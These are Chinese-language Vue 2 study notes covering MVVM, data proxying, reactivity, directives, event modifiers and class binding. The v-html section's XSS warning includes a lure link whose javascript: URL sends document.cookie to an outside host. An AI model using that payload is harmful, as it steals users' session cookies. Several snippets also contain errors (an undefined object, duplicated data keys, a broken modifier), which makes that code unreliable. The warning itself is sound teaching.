------

# MVVM思想

MVVM模型：Vue是一种用于构建用户界面的渐进式框架，采用了MVVM（Model-View-ViewModel）的架构思想。

M：模型(Model)：data中的数据（数据和业务逻辑）。
V：视图(View)：模板代码（用户界面）。
VM：视图模型(ViewModel)：Vue实例（两者之间的中介）。

注意：
data中的属性最后都出现在了vm上。
vm上所有属性在vue模板中都可以直接使用。

模式行为：
		ViewModel将Model中的数据绑定到View上，并通过监听来自View的事件来更新Model中的数据。

作用：
		这种数据绑定和事件监听使得开发者能够编写简单、高效的代码，并将应用程序的不同部分解耦，从而实现更好的代码复用和维护。

------

# 数据代理&监测

## Object.defineProerty

它允许你在一个对象上定义一个新属性或修改一个已有属性。

```javascript
/**
 *  Object.defineProperty(obj,prop,descriptor) 定义新属性或修改原有属性 
 *  三个参数都不能省略
 *  obj： 目标对象
 *  prop: 需要定义或修改的属性名
 *  descriptor: 目标属性所拥有的特性
 * 
 * 特性属性配置
 * writable: false 不可重写这个属性，默认false
 * enumerable: false,// 不可遍历 ，默认false
 * configurable: false // 不可删除且不能修改第三个参数其它特性，默认false
 */
let str = 'red';
let Singer = {
    name: '邓紫棋',
    hobby: '唱',
    hot: 666
}
Object.defineProperty(person, "color", {
    // value: 'red',// 不可枚举 (遍历、keys)
    // enumerable: true, // 是否可以枚举，默认false
    // writable : true, // 控制属性是否可修改，默认false
    // configurable:true // 控制属性是否可删除，默认false

    // 当有人读取person的age属性，就会调用getter（get函数）,且返回值是color的值
    get: function () {
        console.log("color给读取了")
        return str;
    },

    // 当有人修改person的age属性，就会调用getter（get函数）,且返回值是修改的值
    set(value) {
        console.log("color给修改了")
        return str = value;
    }
})

```

## 简单理解什么是数据代理

通过一个对象代理另一个对象中属性的操作 读/写

```javascript
// 1. 通过对象自己操作自己的属性值
// 2. 用obj2对象的属性值修改obj的属性值
let obj = { x: 100 } // 
let obj2 = { y: 200 } //
Object.defineProperty(obj2, 'x', {
    get() {
        return obj.x  // 操作obj2实际读取的是obj的
    },
    set(value) {
        return obj.x = value  //  // 操作obj2实际修改的自己的和obj的
    }
})
```

## vue的数据代理

1.Vue中的数据代理：
	通过vm对象来代理data对象中属性的操作（读/写）
2.Vue中数据代理的好处：
	更加方便的操作data中的数据，（没有就data中所有属性就不能直接调用）
3.基本原理：
(1) 通过Object.defineProperty()把data对象中所有属性添加到vm的_data上。
(2) 为每一个添加到vm上的data属性，都指定一个getter/setter。
(3) 在getter/setter内部去操作（读/写）data中对应的属性。

### 验证vm中的_data是否等于data

```html
<div id="root">
    <h1>你好，{{name}}</h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
	let data = {
  	  	name: 'YZling',
    	color: 'red'
	}
	const vm = new Vue({
    	el: '#root',
    	data
    	// data: {
    	//     name: 'YZling',
    	//     color: 'red'
    	// }
	})
	console.log(vm._data === data) // true
</script>
```

### 数据劫持

_data中的数据不是直接显示

## 模拟一个数据代理（对象）

```javascript
let data = {
	name: '尚硅谷',
	address: '北京',
}
// 1.创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs)
// 4. 准备一个vm实例对象
let vm = {}
vm._data = data = obs
function Observer(obj) {
	// 2. 汇总对象中所有的属性形成一个数组
	const keys = Object.keys(obj)
	// 3. 遍历
	keys.forEach((k) => {
		Object.defineProperty(this, k, {
			get() {
				return obj[k]
			},
			set(val) {
				console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
				obj[k] = val
			}
		})
	})
}
```

------

## Vue监测数据改变的原理

Vue监视数据的原理：
1. vue会监视data中所有层次的数据。
2. 如何监测对象中的数据？(**监测对象**)
    通过setter实现监视，且要在new Vue时就传入要监测的数据。
	 (1).对象中后追加的属性，Vue默认不做响应式处理
	 (2).如需给后添加的属性做响应式，请使用如下API：
		Vue.set(target，propertyName/index，value) 或 
		vm.$set(target，propertyName/index，value)
3. 如何监测数组中的数据？（**监测数组**）
    通过包裹数组更新元素的方法实现，本质就是做了两件事：
	 (1).调用原生对应的方法对数组进行更新。
	 (2).重新解析模板，进而更新页面。
4. 在Vue修改数组中的某个元素一定要用如下方法：
    (1)使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
    (2)Vue.set() 或 vm.$set()
5. 特别注意：Vue.set() 和 vm.$set() 不能给vm 或 vm的根数据对象 添加属性！！
6. **vue响应式问题**：直接增添修改删除属性 响应式无效，但数据改了。（vue3解决）

```html
<div id="root">
	<button @click="vsinger.hot++">热度+1</button>
	<button @click="addGenter">添加音域属性: 未知</button>
	<button @click="vsinger.range = 'g2~c5'">修改音域为: g2~c5</button>
	<button @click="addHobby">爱好列表首位添加一个爱好：跳</button>
	<button @click="changeFristHobby">修改爱好列表首位爱好为：弹吉他</button>
	<button @click="addInfoYzl">添加一个信息: singer</button>
	<button @click="updateInfoYzl">修改第一个信息: 乐正绫</button>
	<button @click="removeInfoYzl">过滤掉信息中的: 怕死鱼眼</button>
	<hr>
	<h3>热度：{{vsinger.hot}}</h3>
	<h3 v-if="vsinger.range">性别：{{vsinger.range}}</h3>
	<h3>爱好</h3>
	<ul>
		<li v-for="(value,index) in  vsinger.hobby" :key="index">
			{{value.h}}--{{value.what}}
		</li>
	</ul>
	<h3>信息</h3>
	<ul>
		<li v-for="(info,index) in vsinger.yzl" :key="index">
			{{info}}
		</li>
	</ul>
</div>

<script type="text/javascript">
    // 
    import Vue from 'vue'
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	const vm = new Vue({
		el: '#root',
		data: {
			vsinger: {
				name: 'yzl',
				hot: 412,
				hobby: [
					{ h: '吃', what: '豆腐' },
					{ h: '唱', what: '梦语' }
				],
				yzl: ['月挣零', '红色', '412', '怕死鱼眼']
			}
		},
		methods: {
			// 数据监测-对象-增添
			addGenter() {
                  // this.vsinger.gender = '男' // 响应式无效，数据改了
				// Vue.set(this.vsinger,'gender','男')
				this.$set(this.vsinger, 'gender', '未知')
                  // 删除
                  // this.$delete(this.vsinger, 'gender')
                  // Vue.delete(this.vsinger,'gender')
                  // delete this.vsinger.gender // 响应式无效，数据改了
			},
			// 数据监测-数组-增添
			addHobby() {
				this.vsinger.hobby.unshift({ h: '跳', what: '极乐净土' })
			},
			// 数据监测-数组-更新
			changeFristHobby() {
				this.vsinger.hobby[0].h = '弹';
				this.vsinger.hobby[0].what = '吉他与孤独与蓝色星球';
			},
			// 数据监测-数组-增添
			addInfoYzl() {
				this.vsinger.yzl.push('singer')
			},
			// 数据监测-数组-更新
			updateInfoYzl() {
				// this.vsinger.yzl.splice(0,1,'乐正绫')
				// Vue.set(this.vsinger.yzl, 0, '乐正绫')
				this.$set(this.vsinger.yzl, 0, '乐正绫')
			},
			// 数据监测-数组-增添
			removeInfoYzl() {
				this.vsinger.yzl = this.vsinger.yzl.filter((info) => {
					return info !== '怕死鱼眼'
				})
			}
		}
	})
</script>
```



------

# Vue实例

## 	一个基本的vue实例

包含HTML模板、JavaScript代码和Vue实例

```html
<html>
<head>
    <title>初见Vue</title>
    <!-- 引入vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h1>Hello {{name.toUpperCase()}}{{1+2}}</h1>
    </div>
    <script type="text/javascript">
        /**
         * 1. 用Vue必须要创建一个实例，和一个配置对象
         * 2. root容器里的代码依然符合html规范
         * 3. root容器里的代码称其为【Vue模板】
         * 4. 一个容器对应一个vue实例(开发中也用一个vue实例)
         * 5. {{}}里面是js表达式（能产生一个值）
         */
        Vue.config.productionTip = false // 阻止vue生产提示

        // 创建Vue实例
        // const x = 
        new Vue({
            el: '#root',
            data: {
                name: 'Vue'
            }
        })
    </script>
</body>

</html>
```

## 	el和data

### el和data的两种写法

1. 配置el 和 v.$mount()
2. data:{} 和 data:function () { return {} }

### el的两种写法

```html
<div id="root">
    <h1>你好，{{name}}</h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    const v = new Vue({
        el: '#root', // 1. 第一种
        data: {
            name: 'YZling'
        }
    }) 
    // v.$mount('#root') // 第二种
```

### data的两种写法

**为什么data必须返回一个对象**：如果我们直接提供一个对象，则所有实例将共享同一个数据对象，导致出现不可预料的错误

```html
<div id="root">
    <h1>你好，{{name}}</h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示

    const v = new Vue({
        el: '#root',
        // 1. 对象式
        data:{
			name:"G2C5"
        }
        // 2. 函数式，必须返回一个对象
        // 2. (1) 完整写法
        data:function(){
        	return {
               name:"G2C5" 
            }
    	}
    	// 2. (2) 常用简写
    	data:{
            return {
                name:"G2C5"
            }
        }
        // 3. 箭头函数
    	data:()=>{
        	return {
                name:"G2C5"
            }
    	}
    })
```

# 插值&指令

## Vue两大类模板语法

1.  插值语法：
    功能：解析标签内容。
    写法：{{xxx}},里面是js表达式，且可以直接读取data中的所有属性

2. 指令语法：
    功能：解析标签（标签属性、标签体内容、绑定事件......）
    例子：v-bind:herf="xxx"，同样要是js表达式，且可以直接读取data中的所有属性

------

## 	插值语法

```html
<div id="root">
        <h1>插值语法</h1>
        <p>Hello {{name}}</p>

        <h1>指令语法</h1>
        <a v-bind:href="url">百度1</a>
        <a :href="url">百度2</a>

        <h1>hello {{name}}</h1>
        <h1>hello {{yzl.name}}</h1>
    </div>

    <script type="text/javascript">
        /**
         * 1. 插值语法：{{xxx}}
         *    适用于标签体内容
         * 2. 指令语法：v-xxx:"xxx" 双引号里面的为js表达式
         *    适用于解析标签：标签属性、标签内容、绑定事件
         */
        Vue.config.productionTip = false // 阻止vue生产提示
        // 创建Vue实例
        new Vue({
            el: '#root',
            data: {
                name: 'World',
                url: 'https://www.baidu.com',
                yzl: {
                    name: 'yzling'
                }
            }
        })
    </script>
```

------

## 		内置指令

#### 总结

| 序号 | 指令        | 作用                                                      | 补充说明             |
| ---- | ----------- | --------------------------------------------------------- | -------------------- |
| 1    | v-bind:xxx  | 单向绑定：数据只能从data流向页面                          | 简写  :xxx           |
| 2    | v-model:xxx | 双向绑定：数据能从data流向页面，也能从页面流向data        | 简写  v-model        |
| 3    | v-text:xxx  | 向其所在的节点中渲染文本内容，                            | 会替换掉节点中的内容 |
| 4    | v-html:xxx  | 向指定节点中渲染包含html结构的内容，                      | 会替换掉节点中的内容 |
| 5    | v-clock:xxx | 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题 |                      |
| 6    | v-once:xxx  | 所在节点在初次动态渲染后，就视为静态内容了                |                      |
| 7    | v-pre:xxx   | 跳过其所在节点的编译过程                                  |                      |

------

| 序号 | 指令    | 作用                               | 补充说明                     |
| ---- | ------- | ---------------------------------- | ---------------------------- |
| 1    | v-for:  | 遍历数组/对象/字符串               |                              |
| 2    | v-on:   | 绑定事件监听,                      | 简写  @                      |
| 3    | v-if:   | 条件渲染（动态控制节点是否存存在） | 不满足条件，节点不不存在;    |
| 4    | v-else: | 条件渲染（动态控制节点是否存存在） | 配合v-if:使用，结构不能打断  |
| 5    | v-show: | 条件渲染 (动态控制节点是否展示)    | 不满足条件，节点存在但被隐藏 |

------

#### 			v-model&v-bind

| v-model修饰符 | 作用                           |
| ------------- | ------------------------------ |
| .number       | 自动将用户输入的值转化为数字   |
| .trim         | 自动过滤用户的首尾空白字符     |
| .lazy         | 在`changer`时而非`input`时更新 |

```html
<div id="root">
    <!-- 普通写法 -->
    <!--
		1. 单向数据绑定 <input type="text" v-bind:value="name">
		2. 双向数据绑定 <input type="text" v-model:value="name"> 
	-->
    <!-- 简写 -->
    单向数据绑定 <input type="text" :value="name"><br>
    双向数据绑定 <input type="text" v-model="name">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue生产提示
    /**
     *    数据绑定 指令语法：
     * 1. 单向绑定(v-bind):  数据只能从data流向页面
     *    (1) 简写为 :xxx
     * 2. 双向绑定(v-model):  数据能从data流向页面，也能从页面流向data
     *   （1）一般应用到表单元素
     *    (2) 默认收集value值，所以v-model:value 可以简写为v-model
     */
    // 创建Vue实例
    new Vue({
        el: '#root',
        data: {
            name: 'World'
        }
    })
</script>
```

#### v-text:

v-text指令：
	1.作用：向其所在的节点中渲染文本内容。
	2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
    3.不能解析标签

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <h1 v-text="name">你好（被替换）</h1>
    <h1 v-text="str">你好（被替换）</h1>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    const v = new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            str: '<h1>hhh</h1>'
        }
    })
</script>
```

#### v-html:

v-html指令：
		1.作用：向指定节点中渲染包含html结构的内容。
		2.与插值语法的区别：
					(1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
					(2).v-html可以识别html结构。
		3.严重注意：v-html有安全性问题！！！！
					(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
					(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```html
<div id="root">
	<h1>你好，{{name}}</h1>
	<h1 v-text="name">你好</h1>
	<h1 v-html="str1">你好</h1>
	<h1 v-html="str2">你好</h1>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false // 阻止vue启动生产提示
	const v = new Vue({
		el: '#root',
		data: {
			name: 'YZling',
			str1: '<h1>hhh</h1>',
			str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
		}
	})
</script>
```

------

#### v-clock:

v-cloak指令（没有值）：
	1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
	2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。

```html
<html>
<head>
	<meta charset="UTF-8" />
	<title>v-cloak指令</title>
	<style>
		[v-cloak] {
			display: none;
		}
	</style>
	<!-- 引入Vue -->
</head>
<body>
	<div id="root">
		<h2 v-cloak>{{name}}</h2>
	</div>
	<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
</body>

<script type="text/javascript">
	Vue.config.productionTip = false // 阻止vue启动生产提示
	const v = new Vue({
		el: '#root',
		data: {
			name: 'YZling'
		}
	})

</script>
</html>
```



#### v-once:

v-once指令：
1.v-once所在节点在初次动态渲染后，就视为静态内容了。
2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<div id="root">
	<h2 v-once>{{name}}初始热度:{{hot}}</h2>
	<h2>{{name}}热度：{{hot}}</h2>
	<button @click="hot++">打call</button>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

	new Vue({
		el: '#root',
		data: {
			name: 'yzl',
			hot: 412
		}
	})
</script>
```



#### v-pre:

v-pre指令：
1.跳过其所在节点的编译过程。
2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

```html
<div id="root">
	<h2 v-pre v-once>{{name}}初始热度:{{hot}}</h2>
	<h2 v-once>{{name}}初始热度:{{hot}}</h2>
	<h2>{{name}}热度：{{hot}}</h2>
	<button @click="hot++">打call</button>
</div>
<script type="text/javascript">
	Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
	new Vue({
		el: '#root',
		data: {
			name: 'yzl',
			hot: 412
		}
	})
</script>
```



------

## 		自定义指令

#### 注意事项：

1. **指令名的命名方式**为驼峰式命名法（myDirective），在模板中使用时需要将指令名v-转换为短横线命名法（v-my-directive）。
2. **指令定义**可以是一个对象，包含多个钩子函数，也可以是一个函数，该函数返回一个对象，包含多个钩子函数。
3. **钩子函数**是用来在指令的生命周期中执行相应的逻辑的。
4. **指令的钩子函数的参数**包括 `el`、`binding`、`vnode` 和 `oldVnode`。
5. 自定义指令的钩子函数中，不应该直接操作 DOM，而应该通过 `vnode` 和 `el` 参数进行操作，以避免直接操作 DOM 带来的副作用和不可预期的行为。
6. 为了防止内存泄漏，自定义指令应该在 `unbind` 钩子函数中清理它们创建的资源和事件监听器。

#### 自定义指令的钩子函数：

1. `bind(el, binding, vnode)`：在指令与元素成功绑定时立即执行。可以在这里进行初始化设置，如添加事件监听器、缓存 DOM 节点等。
2. `inserted(el, binding, vnode)`：在被绑定的元素插入到父元素中时执行，只触发一次。可以在这里进行一些需要 DOM 的操作。
3. `update(el, binding, vnode, oldVnode)`：当被绑定元素的值更新时执行，而不论绑定值是否改变。可以在这里更新元素的样式或者其他属性。
4. `componentUpdated(el, binding, vnode, oldVnode)`：在被绑定元素所在的组件更新之后调用，而不论绑定值是否改变。可以在这里进行操作，例如使用 `this.$nextTick` 更新视图。
5. `unbind(el, binding, vnode)`：在指令与元素解绑时执行。可以在这里进行清理操作，如移除事件监听器、取消缓存等。

#### 钩子函数的参数

- `el`：被绑定指令的元素，可以使用原生 DOM 方法操作元素。
- `binding`：包含以下属性：
  - `name`：指令的名称，不包括 `v-` 前缀。
  - 444`value`：指令的绑定值，可以是任意 JavaScript 表达式，如 `v-my-directive="'hello world'"` 中的 `'hello world'`。
  - `oldValue`：指令绑定的前一个值，在 update 和 componentUpdated 钩子函数中可用。
  - `expression`：绑定值的字符串形式。
  - `arg`：指令的参数，如 `v-my-directive:arg` 中的 `arg`。
  - `modifiers`：一个包含修饰符的对象，如 `v-my-directive.modifier1.modifier2` 中的 `{ modifier1: true, modifier2: true }`。
- `vnode`：虚拟节点，可以使用其上的属性和方法操作元素。
- `oldVnode`：上一个虚拟节点，只在 update 和 componentUpdated 钩子函数中可用。

#### 局部指令

```html
<!--
    实现功能： 
    1. 给【实时热度】绑定自定义指令v-dacall。
    2. 实现点击【打call】热度放大十倍显示。
    3. 实现浏览器载入页面时输入框获取焦点 。
-->

<div id="root">
    <h1>你好，{{name}}</h1>
    <h1>初始热度：<span>{{hot}}</span></h1>
    <h1>实时热度：<span v-dcall="hot"></span></h1>
    <button @click="hot++">打call</button>
    <input type="text" v-fbind:value="hot">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false 
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            hot: 1
        },
        directives: {
            // dacall函数何时被用？1.指令于元素绑定成功时。2.指令所在模板被重新解析时
            dacall(element, binding) {
                element.innerText = binding.value * 10
            },
            fbind: {
                // 指令于元素绑定成功时
                bind(element, binding) {
                    element.value = binding.value
                },
                // 元素被插入页面完成时
                inserted(element, binding) {
                    element.focus()
                },
                // 指令所在模板被重新解析时
                update(element, binding) {
                    element.value = binding.value
                }
            }
        }
    })
</script>
```

#### 全局指令

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <h1>初始热度：<span>{{hot}}</span></h1>
    <h1>实时热度：<span v-dcall="hot"></span></h1>
    <button @click="hot++">打call</button>
    <input type="text" v-fbind:value="hot">
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    // 定义全局指令
	Vue.directive('fbind-test', {
        // 自定义指令钩子
    	// 指令于元素绑定成功时
    	bind(element, binding) {
        	element.value = binding.value
    	},
    	// 元素被插入页面完成时
    	inserted(element, binding) {
        	element.focus()
    	},
    	// 指令所在模板被重新解析时
    	update(element, binding) {
        	element.value = binding.value
    	}
	})
    new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            hot: 1
        }
        
    })
</script>
```

## 修饰符

常用修饰符**注意事项**：

1. 修饰符可以串联。
2. 修饰符是由点开头的指令后缀来表示的。

| 序号 | 事件修饰符 | 说明                                         | 注意事项             |
| ---- | ---------- | -------------------------------------------- | -------------------- |
| 1    | .stop      | 阻止事件冒泡（常用）                         |                      |
| 2    | .prevent   | 阻止默认事件（常用）                         |                      |
| 3    | .capture   | 使用事件的捕获模式                           |                      |
| 4    | .self      | 只当在 event.target 是当前元素自身时触发     | 即不是从内部元素触发 |
| 5    | .once      | 事件只触发一次（常用）                       |                      |
| 6    | .passive   | 滚动事件的默认行为 (即滚动行为) 将会立即触发 | 不等 onScroll完成    |
| 6    |            | 包含 `event.preventDefault()` 的情况         |                      |
|      | .lazy      | v-model修饰符                                |                      |
|      | .number    | v-model修饰符                                |                      |
|      | .trim      | v-model修饰符                                |                      |





注意事项：

### 		事件修饰符

使用修饰符**注意事项**：

1. 修饰符可以串联。
2. 修饰符是由点开头的指令后缀来表示的。

| 序号 | 事件修饰符 | 说明                                         | 注意事项             |
| ---- | ---------- | -------------------------------------------- | -------------------- |
| 1    | .stop      | 阻止事件冒泡（常用）                         |                      |
| 2    | .prevent   | 阻止默认事件（常用）                         |                      |
| 3    | .capture   | 使用事件的捕获模式                           |                      |
| 4    | .self      | 只当在 event.target 是当前元素自身时触发     | 即不是从内部元素触发 |
| 5    | .once      | 事件只触发一次（常用）                       |                      |
| 6    | .passive   | 滚动事件的默认行为 (即滚动行为) 将会立即触发 | 不等 onScroll完成    |
| 6    |            | 包含 `event.preventDefault()` 的情况         |                      |
|      |            |                                              |                      |
|      |            |                                              |                      |



注意事项：

1. 这个 `.passive` 修饰符尤其能够提升移动端的性能。
2. 不要把 `.passive` 和 `.prevent` 一起使用，因为 `.prevent` 将会被忽略，同时浏览器可能会向你展示一个警告。请记住，`.passive` 会告诉浏览器你*不*想阻止事件的默认行为。

#### 事件传递过程

事件传递过程中有三个阶段：**捕获阶段**、**目标阶段**和**冒泡阶段**。

**捕获阶段**：事件从最外层的父元素开始向下传递，直到达到目标元素所在的层级。

**目标阶段**：事件在目标元素上触发，并执行与该元素相关的事件处理程序。

**冒泡阶段**：事件从目标元素开始向上冒泡，直到达到最外层的父元素。

------

#### 阻止事件冒泡

**事件冒泡**（Event Bubbling）是指当一个元素上的事件被触发后，该事件会向父级元素逐级传播，直到传播到最外层的元素为止。

```html
<!-- 点击按钮触发事件showInfo2并阻止冒泡到父级div触发事件showInfo1 -->
<div id="root">
    <div class="demo1" @click="showInfo1">
	<button @click.stop="showInfo2">点我提示信息</button>
	</div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
            showInfo1(event) {
                alert('你好1')
            },
            showInfo2(event) {
                alert('你好2')
            }
        }
    })
</script>
```

------

#### 阻止默认事件

```html
<!-- 阻止a标签的默认行为（跳转） -->
<div id="root">
    <a href="https://www.baidu.com" @click.prevent="showInfo1">百度</a>
    <a href="https://www.baidu.com" @click="showInfo1">正常百度</a>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
            showInfo1(event) {
                alert('你好1')
            }
        }
    })
</script>
```



------

#### 事件的捕获模式

**捕获阶段**：事件从最外层的父元素开始向下传递，直到达到目标元素所在的层级。

```html
<!-- 捕获阶段点击div2时捕获阶段：从父级div1开始=>到目标div2，顺序触发事件（先1后2） -->
<div id="root">
    <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
     </div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
           showMsg(msg) {
                    console.log(msg)
           },
        }
    })
</script>
```



------

#### 当前元素自身时才触发

```html
<!-- 只有event.target是当前操作的元素时才触发事件,防止冒泡 -->
<div id="root">
    <div class="demo1" @click.self="showInfo('div')">
            <button @click="showInfo('button')">点我提示信息</button>
    </div>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
           showInfo(msg) {
                    console.log('我是'+msg)
           },
        }
    })
</script>
```



------

#### 事件只触发一次

```html
<!-- 事件只触发一次（常用） -->
<div id="root">
      <button @click.once="once('昙花一现')">一次事件</button>
      <button @click="once('春风吹又生')">事件</button>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
           once(msg) {
                alert(msg)
           },
        }
    })
</script>
```



------

#### 滚动事件的默认行为

```css
.list {
	width: 200px;
	height: 200px;
	background-color: peru;
	overflow: auto;
}
li {
	height: 100px;
}
```

```html
<!-- 
	事件的默认行为立即执行，无需等待事件回调执行完毕；
	scroll滚动条滚动，wheel鼠标滚轮动了就触发
-->
<div id="root">
<!-- 
	@wheel：demo计数完了滑块才滚动
	@wheel.passive：demo计数前滑块就滚动
-->
    <!-- <ul @wheel.passive="demo" class="list"> -->
	<ul @wheel="demo" class="list">
		<li>1</li>
		<li>2</li>
		<li>3</li>
		<li>4</li>
	</ul>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    new Vue({
        el: '#root',
        data: {},
        methods: {
			demo() {
				for (let i = 0; i < 10000; i++) {
					console.log('#')
				}
				console.log('累坏了')
			}
        }
    })
</script>
```



------

# Vue模板语法

## 	事件

### 监听事件

| 序号 | 监听事件&要点    | 说明                             | 注意事项        |
| ---- | ---------------- | -------------------------------- | --------------- |
| 1    | v-on:xxx="fun"   | 指令监听 DOM 事件                |                 |
| 2    | @xxx="fun"       | v-on接收一个需要调用的方法名称   |                 |
| 3    | @xxx="fun(参数)" | 在内联 JavaScript 语句中调用方法 |                 |
| 4    | event            | 默认事件形参                     | 是原生 DOM 事件 |
| 5    | $even            | 隐含属性对象: $even              | 占位            |

#### v-on

```html
<div id="root">
	<button v-on:click="hot++">count+1</button>
    <p> hot:{{ hot }} </p>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false // 阻止vue启动生产提示
	const vm = new Vue({
    	el: '#root',
    	data: {
        	hot: 0
    	}
})
</script>
```

#### 事件处理方法（methods）

1. 处理复杂逻辑的事件时，在methods中定义方法来处理事件，用v-on接收调用的方法名。
2. `this` 在方法里指向当前 Vue 实例。
3. `event` 是原生 DOM 事件。
4. 也可以用 JavaScript 直接调用方法
5. $event占位

```html
<div id="root">
	<button v-on:click="say">say hellow</button>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false // 阻止vue启动生产提示
	const vm = new Vue({
    	el: '#root',
    	data: {
        	name: 'Vue.js'
    	},
        // 在 `methods` 对象中定义方法，没数据劫持、代理
        methods:{
            say: function( event ) {
                // `this` 在方法里指向当前 Vue 实例
                 alert('Hello ' + this.name + '!')
			    if (event) {
        			 alert(event.target.tagName)
			    }
            }
        }
})

vm.say() // => 'Hello Vue.js!'
</script> 
```

#### 事件处理方法（含参数）

 默认事件形参: event，隐含属性对象: $even

内联处理器中的方法：在内联 JavaScript 语句中调用方法，传递参数，特殊变量 `$event` 把它传入方法，访问原始的 DOM 事件。

```html
<div id="root">
    <!-- $event占位 -->
	<button v-on:click="say($event,'Hello')">say hellow</button>
</div>

<script type="text/javascript">
	Vue.config.productionTip = false // 阻止vue启动生产提示
	const vm = new Vue({
    	el: '#root',
    	data: {},
        methods:{
            say: function( message,event ) {
                 alert(message)
            }
        }
})
</script> 
```

------

### 键盘事件

```html
<!-- 
	1.Vue中常用的按键别名：
		回车 => enter
		删除 => delete (捕获“删除”和“退格”键)
		退出 => esc
		空格 => space
		换行 => tab (按下tab切换焦点、特殊，必须配合keydown去使用)
		上 => up
		下 => down
		左 => left
		右 => right
        特殊 caps-lock
	2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为
kebab-case（短横线命名）
	3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
	    (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其
他键，事件才被触发。
		(2).配合keydown使用：正常触发事件。
    4.也可以使用keyCode去指定具体的按键（不推荐）
	5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
	-->
<div id="root">
    <h1>你好，{{name}}</h1>
    <input type="text" placeholder="回车键提示输入" @keyup.enter.
y="showInfo">
</div>
<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    Vue.config.keyCodes.huiche = 13 //定义了一个别名按键
    const v = new Vue({
        el: '#root',
        data: {
            name: 'YZling'
        },
        methods: {
            showInfo(e) {
                // 方式一 使用keyCode去指定具体的按键
                // if (e.keyCode === 13) {
                //     alert('test input')
                // }
                // 方式二 键盘事件修饰符
                alert('test input')
            }
        }
    })
</script>
```



------

## 	样式绑定（属性绑定）

### 		class样式

**写法**:class="xxx" xxx可以是字符串、对象、数组。
**字符串写法**适用于：类名不确定，要动态获取。
**对象写法**适用于：要绑定多个样式，个数不确定，名字也不确定。
**数组写法**适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。

```html
<div id="root">
    <!-- 绑定class样式，字符串写法，适用情形：类名不确定，要动态指定类名 -->
    <div class="basic" :class="mood" @click="changeMood">{{name}}</div>
    <!-- 绑定class样式，数组写法，适用情形：样式个数和名字都不确定 -->
    <div class="basic" :class="classArr">{{name}}</div>
    <!-- 绑定class样式，数组写法，适用情形：样式个数确定和名字确定，但要动态决定 -->
    <div class="basic" :class="classObj">{{name}}</div>
<div/>
<script type="text/javascript">
    Vue.config.productionTip = false 
    const vm = new Vue({
        el: '#root',
        data: {
            name: 'YZling',
            mood: 'normal', // 动态-默认样式
            classArr: ['yzl-bgc', 'yzl-size', 'yzl-radius'],
            classObj: {
                'yzl-bgc': false,
                'yzl-size': false,
                'yzl-radius': true
            },
        },
        methods: {
            changeMood() {
                const arr = ['yzl', 'lty', 'xc1', 'xc2']
                this.mood = arr[Math.floor(Math.random() * 4)]
            }
        }
    })
</script> 
```

```css
.basic {
    width: 400px;
    height: 100px;
    border: 1px solid black;
}
/* 动态绑定样式 */
.yzl {
    background-color: #EE0000;
}
.lty {
    background-color: #66CCFF;
}
.xc1 {
    background-color: #FFFF00;
}
.xc2 {
    background-color: #9999FF;
}
/* 数组写法样式 */
.yzl-bgc {
    background-color: yellowgreen;
}
.yzl-size {
    font-size: 30px;
    text-shadow: 2px 2px 10px red;
}
.yzl-radius {
    border-radius: 20px;
}
```

